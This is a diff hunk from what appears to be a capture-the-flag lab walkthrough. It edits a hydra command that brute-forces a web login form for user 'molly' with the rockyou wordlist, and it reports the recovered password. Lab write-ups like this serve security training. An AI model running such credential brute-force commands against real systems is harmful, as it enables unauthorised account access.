@@ -217,7 +217,7 @@ gunzip -k rockyou.txt.gz
 So now we are ready to bruteforce attack that web form with our username and wordlist:
 
 ```commandline
-hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.180.225 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.180.225 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V
 ```
 
 After a few seconds, not to long actually, we found what we need, the password `sunshine` of user `molly`.
